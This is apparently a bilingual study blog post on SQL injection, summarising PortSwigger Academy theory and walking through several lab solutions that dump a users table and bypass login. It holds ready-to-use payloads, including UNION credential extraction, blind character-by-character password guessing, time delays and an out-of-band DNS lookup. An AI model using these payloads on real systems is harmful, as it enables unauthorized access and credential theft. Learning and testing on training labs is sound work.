---
title: "Postswigger - Advanced topic - SQL injeciton"
excerpt: "Trong tuần này mình sẽ học thêm về lỗ hổng sql injection. Tìm hiểu cách tìm và khai thác các loại lỗ hổng SQL injection khác nhau và tóm tắt cách ngăn chặn SQL injection."
header:
show_date: true
header:
  teaser: /assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/teaser.png
  teaser_home_page: true
  icon: /assets/images/images-icon/burpsuite-academy.png
  overlay_image: /assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/background.jpg
categories:
  - Learn
tags:
  - Learn
  - Vietnamese
  - Sql-injection
---

Trong phần này, sẽ giải thích SQL injection (SQLi) là gì. mô tả một số ví dụ phổ biến, giải thích cách tìm và khai thác các loại lỗ hổng SQL injection khác nhau và tóm tắt cách ngăn chặn SQL injection.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/Hk2F_FBj2.png)


# SQL injection (SQLi) là gì?
SQL injection (SQLi) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà một ứng dụng thực hiện đối với cơ sở dữ liệu của nó.
Nó thường cho phép kẻ tấn công xem dữ liệu mà chúng thường không thể truy xuất. Điều này có thể bao gồm dữ liệu thuộc về người dùng khác hoặc bất kỳ dữ liệu nào khác mà chính ứng dụng có thể truy cập. Trong nhiều trường hợp, kẻ tấn công có thể sửa đổi hoặc xóa dữ liệu này, gây ra những thay đổi liên tục đối với nội dung hoặc hành vi của ứng dụng.

Trong một số trường hợp, kẻ tấn công có thể leo thang tấn công SQL injection để thỏa hiệp máy chủ cơ bản hoặc cơ sở hạ tầng back-end khác hoặc thực hiện tấn công từ chối dịch vụ.


# Tác động của một cuộc tấn công SQL injection thành công là gì?

Một cuộc tấn công SQLi thành công có thể dẫn đến truy cập trái phép vào dữ liệu nhạy cảm, chẳng hạn như mật khẩu, chi tiết thẻ tín dụng hoặc thông tin người dùng cá nhân. NHiều vi phạm dữ liệu coa cấp trong những năm gần đây là kết quả của các cuộc tấn công SQL injection, dẫn đến thiệt hại danh tiếng và tiền bạc. Trong một số trường hợp, kẻ tấn công có thể có được một backdoor liên tục vào hệ thống của tổ chức, dẫn đến một sự thỏa hiệp lâu dài có thể không được chú ý.

# Cách phát hiện lỗ hổng SQL injection

Phần lớn các lỗ hổng SQL injection có thể được tìm thấy nhanh chóng và đáng tin bằng [trình quét lỗ hổng web của Burp Suite](https://portswigger.net/burp/vulnerability-scanner).

SQL injection có thể được phát hiện thủ công bằng cách sử dụng một số kiểm tra có hệ thống đối với một endpoint của ứng dụng. Ví dụ:
- Sử dụng ký tự trích dẫn đơn và kiểm tra lỗi hoặc các bất thường xuất hiện
- Gửi một số cú pháp SQL cụ thể đánh giá giá trị cơ sở của endpoint và đến một giá trị khác để tìm kiếm sự khác biệt có hệ thống trong các kết quả phản hồi. vd: ASCII (97)
- Gửi một điều kiện Boolean như `' OR 1=1--` và kiểm tra sự khác biệt trong phản hồi.
-  Gửi một payload kích hoạt độ trễ thời gian khi thực thi truy vấn SQL và kiểm tra sự khác biệt trong thời gian phản hồi.
Vd: `'; waitfor delay ('0:0:20')--`
- Gửi một payload để kích hoạt một tương tác ngoài băng tần và theo dõi phản hồi tới.
Vd: `exec master..xp_dirtree'//adhiadhaidhai.burpcollaborator.net/a`

# SQL injection trong các phần của truy vấn
Hầu hết các lỗ hổng SQL injection phát sinh trong mệnh đề `WHERE` của truy vấn `SELECT`. Dạng SQLi này thường được hiểu rõ bởi những người kiểm thử có kinh nghiệm.
Nhưng về nguyên tắc , lỗ hổng SQL injection có thể xảy ra tại bất kỳ vị trí nào trong một truy vấn và trong các loại truy vấn khác nhau. 
Các vị trí phổ biến nhất mà SQLi có thể xảy ra là:
- Trong các câu lệnh `UPDATE`, ở vị trí giá trị được cập nhật hoặc sau mệnh đề `WHERE`
- Trong các câu lệnh `INSERT`, ở vị trí được chèn
- Trong các câu lệnh `SELECT`, ở vị trí tên bảng hoặc tên cột
- Trong các câu lệnh `SELECT` , ở vị trí mệnh đề `ORDER by`.

# Các ví dụ về SQL injection
Trong nhiều tình huống phát sinh khác nhau, sẽ có nhiều lỗ hổng , tấn công và kỹ thuật SQLi. Một vài ví dụ phổ biến gồm:
- `Retrieving hidden data(trả về dữ liệu ẩn)` : xảy ra khi có thể chỉnh sửa một truy vấn SQL để trả về thêm kết quả.
- `Subverting application logic (phá vỡ logic ứng dụng)`: xảy ra khi có thể thay đổi một truy vấn để ảnh hưởng tới logic của ứng dụng.
- `UNION attack`: xảy ra khi có thể truy xuất dữ liệu từ các bảng dữ liệu khác.
- `Blind SQL injection`: xảy ra khi kết quả của một truy vấn đang tấn công không phản hồi trong các phản hồi của ứng dụng.

## Truy xuất dữ liệu ẩn
Ví dụ: Một ứng dụng mua sắm hiển thị các sản phẩm trong danh mục khác nhau. Khi người dùng nhập vào danh mục `Gifts` trình duyệt sẽ request URL:
`https://insecure-website.com/products?category=Gifts`

Điều này làm cho ứng dụng thực hiện một truy vấn SQL để truy xuất các sản phẩm có liên quan trong cơ sở dữ liệu.

```js
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Giải thích truy vấn:
Truy vấn này sẽ yêu cầu cơ sở dữ liệu trả về:
- Tất cả chi tiết sản phẩm (*)
- Từ bảng `products`
- tại category là `Gifts`
- và released là 1

Hạn chế `released = 1` được sử dụng để ẩn các sản phẩm không được phát hành. `releases=0` đối với các sản phẩm chưa được phát hành.

Ứng dụng không thực hiện bất kỳ phòng thủ nào chống lại các cuộc tấn công SQL injection, vì vậy kẻ tấn công có thể xây dựng một cuộc tấn công như sau:
`https://insecure-website.com/products?category=Gifts'--`

Điều này sẽ tạo ra một truy vấn SQL:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Chuỗi `--` là một chỉ báo nhận xét trong SQL, có nghĩa là phần còn lại của truy vấn là một nhận xét.
=> Điều này hiệu quả để loại bỏ phần còn lại của truy vấn. Điều này có nghĩa là phần `AND released=1` sẽ bị bỏ qua dẫn đến tất cả các sản phẩm sẽ được hiển thị.

Có thể đi xa hơn để hiển thị tất cả các sản phẩm trong bất kỳ category nào bằng payloaf:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

Điều này sẽ dẫn đến truy vấn SQL:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--`

Truy vấn này sẽ trả về tất cả các category trong đó bao gồm `Gifts`
 hoặc 1=1 . Vì 1=1 luôn luôn đúng, nên truy vấn sẽ trả về tất cả các mục.

Hãy cẩn thận khi thêm điều kiện `OR 1=1` vào truy vấn SQL. Mặc dù điều này có thể vô hại trong một số bối cảnh ban đầu khi được đưa vào, nhưng các ứng dụng thường sử dụng dữ liệu từ một yêu cầu trong nhiều truy vấn khác nhau. Ví dụ: nếu điều kiện thuộc câu lệnh `DELETE` hoặc `UPDATE` điều này có thể dẫn đến tai nạn mất dữ liệu hoặc sai sot.
{: .notice--danger}

## Phá vỡ logic ứng dụng
Xem xét một ứng dụng cho phép người dùng đăng nhập bằng tên người dùng và mật khẩu. Nếu người dùng gửi tên người dùng và mật khẩu `wiener|bluecheese`. Ứng dụng web sẽ kiểm tra thông tin đăng nhập bằng cách thực hiện truy vấn SQL sau:
```js
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Nếu truy vấn trả về chi tiết thông tin của người dùng, thì đăng nhập thành công. Ngược lại nó từ chối.

Lợi dụng điều này, kẻ tấn công có thể đăng nhập với tư cách là bất kỳ người dùng nào không cần mật khẩu chỉ cần sử dụng chuỗi nhận xét SQL để xóa phần kiểm tra mật khẩu.

Ví dụ: Gửi username `admin'--` và một password rỗng sẽ dẫn tới kết quả sau:
```js
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Truy vấn này trả về thông tin admin và đăng nhập thành công với tư cách là người dùng đó.


## Truy xuất dữ liệu từ các bảng cơ sở dữ liệu khác

Trong trường hợp, kết quả của truy vấn SQL được trả về trong phản hồi của ứng dụng, kẻ tấn công có thể tận dụng lỗ hổng SQL injection để truy xuất dữ liệu từ các bảng khác trong cơ sở dữ liệu. Điều này được thực hiện bằng cách sử dụng từ khóa `UNION` cho phép thực hiện một truy vấn `SELECT` khác và nối kết quả vào truy vấn ban đầu.

Ví dụ: Nếu một ứng dụng thực hiện truy vấn sau với `Gifts` là đầu vào của người dùng. 
```js
SELECT name, description FROM products WHERE category = 'Gifts'
```

Sau đó, kẻ tấn công có thể truyền một input độc hại như sau:
```js
' UNION SELECT username, password FROM users--
```

Điều này sẽ khiến ứng dụng trả về tất cả tên người dùng và mật khẩu cùng với tên và mô tả sản phẩm.

### Tấn công SQLi sử dụng UNION
Khi một ứng dụng dễ bị tấn công SQLi và kết quả của truy vấn được trả về trong phản hồi của ứng dụng, từ khóa `UNION` có thể được sử dụng để truy xuất dữ liệu từ các bảng khác trong cơ sở dữ liệu. Điều này dẫn đến một cuộc tấn công SQLi UNION.

`UNION` cho phép thực hiện một hoặc nhiều truy vấn `SELECT` bổ sung và thêm kết quả vào truy vấn ban đầu.

```js
SELECT a, b FROM table1 UNION SELECT c,d FROM table2
```
=> Truy vấn này sẽ trả về kết quả duy nhất với 2 cột gồm giá trị của cột a, b trong `table1` và cột c, d trong `table2`.

Có 2 yêu cầu chính để một truy vấn `UNION` hoạt động:
- Mỗi truy vấn riêng lẻ phải trả về cùng một số cột.
- Giữa các truy vấn , các cột phải có kiểu dữ liệu tương thích với nhau.
{: .notice--info}

Có 2 yêu cầu cần đáp ứng để thực hiện tấn công SQL injection `UNION`:
- Có bao nhiêu cột đang được trả về từ truy vấn ban đầu?
- Những cột nào được trả về từ truy vấn ban đầu có kiểu dữ liệu phù hợp để lấy kết quả tiêm.
{: .notice--info}

#### Xác định số lượng cột cần thiết trong một tấn công SQL injection UNION
Có 2 phương pháp xác định số cột trả về từ truy vấn ban đầu.

**Phương pháp 1**: Tiêm một loạt các mệnh đề `ORDER BY` và tăng chỉ mục cột được chỉ định cho đến khi xuất hiện lỗi.

Ví dụ: giả sử điểm tiêm là một chuỗi trong mệnh đề  `WHERE` của truy vấn ban đầu, ta sẽ thử payload như sau:
{: .notice--success}

```js
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

Chuỗi tải trọng này sửa đổi truy vấn ban đầu để sắp xếp kết quả theo các cột khác nhau trong tập kết quả. Trong mệnh để `ORDER BY` có thể chỉ định cột bằng chỉ mục mà không cần tên cột. Khi chỉ mục chỉ định vượt quá số cột thực tế, cơ sở dữ liệu sẽ trả về lỗi. ví dụ như:

The ORDER BY position number 3 is out of range of the number of items in the select list.
{: .notice--danger}

Ứng dụng có thể trả về lỗi cơ sở dữ liệu trong phản hồi HTTP của nó hoặc trả về lỗi chung hoặc đơn giản là không trả về kết quả gì. 

Miễn là bạn phát hiện một số khác biệt trong phản hồi của ứng dụng, bạn có thể suy ra có bao nhiêu cột đang được trả về từ truy vấn.
{: .notice--info}

Phương pháp 2: Gửi một loạt các payload `UNION SELECT` chỉ định một số giá trị null khác nhau.
```js
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

Nếu số null không khớp với số cột, cơ sở dữ liệu trả về lỗi , chẳng hạn như:
```yaml
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Ứng dụng có thể trả về thông báo lỗi trên hoặc có thể chỉ trả về lỗi chung hoặc không có kết quả. 

Khi số `NULL` khớp với số cột, cơ sở dữ liệu trả về một hàng bổ sung trong tập kết quả, chứa các giá trị null trong mỗi cột. Việc ảnh hưởng đến kết quả phản hồi HTTP phục thuộc vào mã của ứng dụng. Nếu may mắn, sẽ có thể thấy một số nội dung bổ sung trong phản hồi. Chẳng hạn như một hàng dữ liệu bổ sung trong mã HTML. Nếu không , các giá trị null có thể gây ra một lỗi khác như một `NullPointerException`. Trường hợp xấu nhất, phản hồi có thể không phân biệt được với phản hồi gây ra bởi số lượng null không chính xác, làm cho phương pháp xác định số cột này không hiệu quả.


- Lý do sử dụng `NULL` làm giá trị trả  về khi tiêm vào truy vấn `SELECT` là mỗi cột phải tương thích giữa truy vấn gốc và truy vấn được tiêm. Vì `NULL` có thể chuyển đổi cho mọi loại dữ liệu thường được sử dụng, sử dụng `NULL` sẽ tăng tỷ lệ thành công của payload khi số lượng cột là chính xác.
- Trên Oracle, mọi truy vấn `SELECT` phải sử dụng từ khóa `FROM` và chỉ định một table hợp lệ. Có một bảng tích hợp trên Oracle được gọi là `DUAL` có thể được sử dụng cho mục đích này. Vì vậy, các truy vấn được đưa vào trên Oracle sẽ giống như sau:
```js
' UNION SELECT NULL FROM DUAL--
```
- Các payload được mô tả sử dụng chuỗi nhận xét `--` để nhập xét phần còn lại của truy vấn sau vị trí tiêm. Trong MySQL, chuỗi dấu gjach ngang kép phải được theo sau bởi một khoảng trắng. Ngoài ra, ký tự `#` cũng có thể được sử dụng để nhận xét.
Chí tiết về cú pháp của từng CSDL cụ thể, xem tại [bảng SQL cheetsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
{: .notice--warning}

#### Tìm cột có kiểu dữ liệu hữu ích trong cuộc tấn công SQL injection UNION.
Nhớ lại, lý do để thực hiện một cuộc tấn công SQLi UNION là để có thể lấy kết quả từ một truy vấn được tiêm. 

Nói chung, dữ liệu mà chúng ta muốn lấy luôn ở dạng chuỗi, vì vậy ta cần tìm một hoặc nhiều cột trong kết quả truy vấn ban đầu có kiểu dữ liệu tương thích với kiểu chuỗi.
{: .notice--warning}

Sau khi đã xác định số lượng cột bắt buộc, ta có thể thăm dò từng cột để kiểm tra xem cột đó có kiểu dữ liệu chuỗi hay không bằng cách gửi một loạt các tải trọng với một giá trị chuỗi vào mỗi cột.
Ví dụ:
```js
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Nếu kiểu dữ liệu của một cột không tương thích với dữ liệu chuỗi, truy vấn được tiêm sẽ gây ra lỗi cơ sở dữ liệu, chẳng hạn như:
```yaml
Conversion failed when converting the varchar value 'a' to data type int.
```

Ngược lại, không có lỗi nào xảy ra và phản hồi của ứng dụng chứa một số nội dung bổ sung bao gồm giá trị chuỗi được tiêm, thì cột có liên quan phù hợp để truy xuất dữ liệu chuỗi.

#### Sử dụng một cuộc tấn công SQLi UNION để lấy dữ liệu thú vị
Sau khi đã có được số lượng cột được trả về từ truy vấn ban đầu và tìm thấy cột có thể chứa dữ liệu chuỗi => ta có thể tiến hành truy xuất dữ liệu trong cơ sở dữ liệu.

Giả sử rằng:
- Truy vấn ban đầu trả về hai cột, cả hai đều có thể chứa dữ liệu chuỗi.
- Điểm tiêm là chuỗi trong mệnh đề `WHERE`.
- Database chứa một bảng `users` với 2 cột `username` và `password`.

Trong trường hợp này, ta có thể truy xuất nội dung của bảng `users` bằng cách gửi input:

```js
' UNION SELECT username, password FROM users--
```

Tất nhiên, thông tin quan trọng cần thiết để thực hiện cuộc tấn công này là có một table `users` với hai cột `username` và `password`. Nếu không có thông tin này, bạn sẽ hải cố gắng đoán tên của các bảng và cột.
Trong thực tế, tất cả các cơ sở dữ liệu hiện đại đều cung cấp các cách kiểm tra cấu trúc cơ sở dữ liệu, để xác định xem nó chứa những bảng và cột nào.

#### Truy xuất nhiều giá trị trong một cột
Trong ví dụ trước, kết quả trả về ở dạng 2 cột.

Giả sử truy vấn chỉ trả về một cột duy nhất. Ta có thể dễ dàng truy xuất nhiều giá trị cùng nhau trong một cột bằng cách nối các giá trị lại với nhau. Tốt nhất là nên sử dụng một ký hiệu phân cách giữa các dữ liệu.

Ví dụ: Đối với Oracle , ta có thể chèn input sau:
```js
' UNION SELECT username || '~' || password FROM users--
```

Truy vấn này sử dụng `||` là một toán tử nối chuỗi trong Oracle. Truy vấn sẽ nối dữ liệu ở 2 cột lại với nhau và phản hồi về giống như một cột.

Kết quả sẽ giống như sau:
```js
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

Lưu ý! các cơ sở dữ liệu khác nhau sẽ có cơ chế nối chuỗi khác nhau.
Tham khảo: https://portswigger.net/web-security/sql-injection/cheat-sheet
{: .notice--danger}


### Blind SQL injection
Trong một số trường hợp SQLi là lỗ hổng blind. Điều này có nghĩa là ứng dụng không trả về bất kỳ lỗi cơ sở dữ liệu nào trong các phản hồi của nó. 
Các lỗ hổng blind vẫn có thể khai thác để truy cập dữ liệu trái phép, nhưng các kỹ thuật liên quan thường phức tạp và khó thực hiện hơn.

Các kỹ thuật sau đây có thể được sử dụng để khai thác lỗ hổng Blind SQLi:
- Thay đổi logic của truy vấn để kích hoạt sự khác biệt có thể phát hiện được trong phản hồi của ứng dụng tùy thuộc vào độ chính xác của một điều kiện. Điều này có thể là đưa một điều kiện mới vào logic Boolean nào đó hoặc kích hoạt một cách có điều kiện một lỗi . Ví dụ: chia cho số 0
- Kích hoạt thời gian trễ một cách có điều kiện trong quá trình xử lý truy vấn, cho phép bạn suy ra tính đúng đắn của điều kiện dựa trên thời gian mà ứng dụng cần để phản hồi.
- Kích hoạt tương tác mạng ngoài băng tần, sử dụng các kỹ thuật OAST. Kỹ thuật này cực kỳ mạnh và hoạt động trong những tình huống mà các kỹ thuật khác không làm được. Thông thường, ta có thể lọc dữ liệu trực tiếp qua kênh ngoài băng tần, chẳng hạn như bằng cách đặt dữ liệu vào tra cứu DNS cho miền mà bạn kiểm soát.

#### Blind sqli là gì?
Phát sinh khi một ứng dụng dễ bị SQLi nhưng không phản hồi kết quả của truy vấn SQL có liên quan hoặc không có bất kỳ lỗi cơ sở dữ liệu nào.

Kỹ thuật tấn công `UNION` không hiệu quả đối với Blind SQLi vì chúng dựa vào việc xem kết quả của truy vấn được chèn trong các phản hồi của ứng dụng. 
=> Vẫn có thể khai thác kỹ thuật SQLi Blind để truy cập dữ liệu trái phép, nhưng phải sử dụng các kỹ thuật khác nhau.

#### Khai thác SQLi bằng cách kích hoạt các phản hồi có điều kiện (triggering conditional responses)
Cho một ứng dụng sử dụng cookie theo dõi để thu thập phân tích về việc sử dụng. Các yêu cầu đối với ứng dụng bao gồm tiêu đề cookie như sau:

```yaml
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Khi một yêu cầu chứa Cookie `TrackingId` được xử lý. Ứng dụng sẽ xác định xem đây có phải là người dùng đã biết hay không bằng truy vấn SQL như sau:
```js
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Truy vấn này dễ bị tấn công bởi SQL injection nhưng kết quả từ truy vấn không được phản hồi lại cho người dùng. Tuy nhiên, ứng dụng sẽ hoạt động khác nhau tùy thuộc vào việc truy vấn có tra về bất kỳ dữ liệu nào hay không. Nếu nó trả về dữ liệu (Công nhận `TrackingId` là đã gửi) , thì thông báo "Chào mừng trở lại" sẽ được hiển thị trong trang.

Hành vi này đủ để khai thác SQL blind và truy xuất thông tin bằng cách kích hoạt các phản hồi khác nhau theo điều kiện, tùy thuộc vào điều kiện được chèn.

Giả sử 2 request lần lượt được gửi có chứa `TrackingId` như sau:

```js
…xyz' AND '1'='1
…xyz' AND '1'='2
```

Giá trị đầu tiên sẽ khiến truy vấn trả về kết quả vì điều kiện `AND '1'='1` được đưa vào là đúng và do đó, thông báo `Welcome back` sẽ được hiển thị. Trong khi đó, giá trị thứ hai sẽ khiến truy vấn không trả về bất kỳ kết quả nào vì điều kiện được đưa vào là sai và do đó, thông báo `Welcom back` sẽ không được hiển thị. 

=> Điều này cho phép chúng ta xác định câu trả lời cho bất kỳ điều kiện đơn lẻ nào được đưa vào và do đó trích xuất dữ liệu từng bit một.

Ví dụ: bảng `Users` với các cột `Username` và `Password`. Và một người dùng được gọi là `Administrator`. Chúng ta có thể xác định mật khẩu ch người dùng này một cách có hệ thống bằng cách gửi một loạt dữ liệu đầu vào để kiểm tra mật khẩu từng ký tự một.

Ví dụ:

```js
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
Điều này trả về thông báo "Welcome back", => điều kiện đưa vào là đúng , do đó ký tự đầu tiên của mật khẩu lớn hơn `m`.

Tiếp theo, tôi gửi một payload khác:
```js
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
=> Kết quả: không trả về thông báo `Welcome back` cho biết => điều kiện đưa vào là sai, ký tự đầu tiên của mật khẩu không lớn hơn `t`.

Tiếp theo, gửi một payload khác:
```js
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
=> Kết quả: trả về "Welcome back" => ký tự đầu tiên của passowrd là `s`.

Tiếp tục quá trình này cho tới khi mình xác định được toàn bộ mật khẩu.

Chú ý: Hàm `SUBSTRING` được gọi `SUBSTR` trên một số loại CSDL khác.
Tham khảo: https://portswigger.net/web-security/sql-injection/cheat-sheet
{: .notice--danger}


### SQL injection dựa trên lỗi (Error-based SQLi)
Đôi khi ta cũng có thể sử dụng thông báo lỗi để trích xuất hoặc suy luận dữ liệu nhạy cảm từ cơ sở dữ liệu, ngay cả trong Blind SQLi. 

Phụ thuộc vào cấu hình của CSDL và các loại lỗi có thể kích hoạt.
- Có thể làm cho ứng dụng trả về phản hồi lỗi cụ thể dựa trên kết quả của một biểu thức boolean. 
[Tham khảo](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors)
- Có thể kích hoạt các thông báo lỗi xuất dữ liệu do truy vấn trả về. Điều này có hiệu quả biến các lỗ hổng Blind SQLi thành lỗ hổng "có thể nhìn thấy".     
[Tham khảo](https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages)
{: .notice--warning}

#### Khai thác Blind SQLi bằng cách kích hoạt các lỗi có điều kiện
Trong ví dụ trước, giả sử ứng dụng thực hiện cùng một truy vấn SQL, nhưng không hoạt động khác đi tùy thuộc vào việc liệu truy vấn có trả về bất kỳ dữ liệu nào hay không. Kỹ thuật trước sẽ không hoạt động, vì việc đưa vào các điều kiện Boolean khác nhau không tạo ra sự khác biệt nào đối với các phản hồi của ứng dụng.


# Làm lab
## Lab: SQL injection vulnerability allowing login bypass
### Description

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/r1Fin2rin.png)

### Solution

Home page:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/ry4ea2Ss2.png)

This challenge requires us to bypass login as `administrator` account.

I found a login section at `/login`.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/Hy_8a2rsh.png)

I tried some sql injection payload and got the following result. `Internal Server Error`

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1XcTnrin.png)

It is very likely that sql injection will occur in this application.

Next, let's insert our payload in the `username` location.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/BkUO0hHin.png)

After submitting I received a `Found` response.

Susscess bypass login. :hamburger: 

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/rkMj02Hsh.png)

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
### Description

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/BJb3QxUin.png)


### Solution
After reading the description, I know that our goal is to determine the number of columns in the query that is performing the attack.

Home page:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/Hyr_4l8ih.png)

After reviewing the application, I found that there are 3 main functions on the web application, including:
- Login function

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/ByTfBxLsh.png)

- Function to display products in catalog
`https://0a6f008303bbb474830d2ea8005400d7.web-security-academy.net/filter?category=Lifestyle`
- Function to view product details by id
`https://0a6f008303bbb474830d2ea8005400d7.web-security-academy.net/product?productId=2`


In the Product display function in the catagory, I tested it with the payload:
`/filter?category="'` then get the following result.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/rJ7dBgUs3.png)

Show that the input data in this section affects and causes errors in the execution.

I see that in this section there are 5 categories that allow searching.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/H1ZMLeUjh.png)

Each category will display 4 products.

Ex:
`https://0a6f008303bbb474830d2ea8005400d7.web-security-academy.net/filter?category=Toys+%26+Games`

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/ryC7DgLs2.png)

i will try applying `Retrieving hidden data` method to read hidden data with payload `' OR 1=1--`.

Ex: `Toys & Games' or 1=1--`
As a result, I can see all products in a category.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/SyNQdlUo2.png)

Now we have located where to insert the sql injection payload. is in `/filter?category=`

I will insert the payload that determines the column number of the query. I will use both methods.

**Method 1:**
```js
/filter?category=Toys & Games' order by 1--
=> return True


/filter?category=Toys & Games' order by 2--
=> reutrn True


/filter?category=Toys & Games' order by 3--
=> return True


/filter?category=Toys & Games' order by 4--
return False

```

With index = 4,
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1Q9YlIjn.png)

**Method 2:**
Gửi một loạt các payload chỉ định số lượng `NULL` khác nhau.

```js
/filter?category=Toys & Games' union select null--
=> return False

/filter?category=Toys & Games' union select null, null--
=> return False


/filter?category=Toys & Games' union select null, null, null--
=> reutrn True

This is because one of the two main conditions for SQLi attack using UNION is that the number of columns of each individual query must be equal, adding `null` means we are detecting if the number of columns is equal to What was the previous query?

```

=> Therefore, it seems that method 1 is the opposite of method 2.

## Lab: SQL injection UNION attack, finding a column containing text
### Description
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/ByLMlNLsn.png)

### Solution

Request: `Make the database retrieve the string: 'Ka3hVz'`

For this challenge we continue to exploit sql injection at the `/filter?category=Gifts` weakness.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/BywuG4Iin.png)

now we need to apply the method of determining the number of columns number 2.

`/filter?category=Gifts' union select null, null, null--`

I determined the column to be exactly 3. Now I'm going to make the database print the requested string with payload.

```js
`/filter?category=Gifts' union select 'Ka3hVz', null, null--`
=> return False


`/filter?category=Gifts' union select null, 'Ka3hVz', null--`
=> return True

`/filter?category=Gifts' union select null, null, 'Ka3hVz'--`

```

## Lab: SQL injection UNION attack, retrieving data from other tables
# Description
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/BkRJ_BUi3.png)

# Solution

Continuing like the previous labs, we need to go deeper to exploit the SQL injection vulnerability.

Home page:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/H1MGOH8on.png)

I noticed, there is still a function to list the entire category through the weak category.
This time I decided to go step by step to have a clearer view of how to mine.

## Identify sql injection weaknesses
Going to category `Pets` I see that there are 4 records listed on the screen.

`https://0a9e004d031be62a80275dd500ab00ea.web-security-academy.net/filter?category=Pets`

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/r14lKBIin.png)

Test payload: 
`https://0a9e004d031be62a80275dd500ab00ea.web-security-academy.net/filter?category=Pets' or 1=1--`

there are 20 records listed. This proved to be a SQL injection vulnerability.

## Determine the number of columns returned by the query


`/filter?category=Pets' union null--`

Result:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/r1Y2trLsh.png)

`/filter?category=Pets' union select null, null--`

Result:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/HJrzcB8jh.png)

=> there are records appearing, this shows that the current query returns 2 columns.


### Defines a column with string data

`/filter?category=Pets' union select 'pwned', null--`

I use the following payload to check if the column is of type string, if the string `pwned` is returned, then the column has string data.
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/r1n-iSUi3.png)

`/filter?category=Pets' union select 'pwned', 'pwned'--`

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/S1tviHIo2.png)

After checking for a while, I noticed that both return columns are of string data type.


### Retrieve all user information.

Next I make use of the following payload to assign the data I want to retrieve into the results of the original query.
`/filter?category=Pets' union select * from users--`

or 

`/filter?category=Pets' union select username,password from users--`

Result:
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/B1iyaBIj2.png)

I found 3 accounts including information of `administrator`

### Login with adminstrator and get solved

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/Sy82aH8jn.png)

## Lab: SQL injection UNION attack, retrieving multiple values in a single column
### Description
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-10-Learn-SQL-injection/ByiiZ88oh.png)

### Solution

Home page:
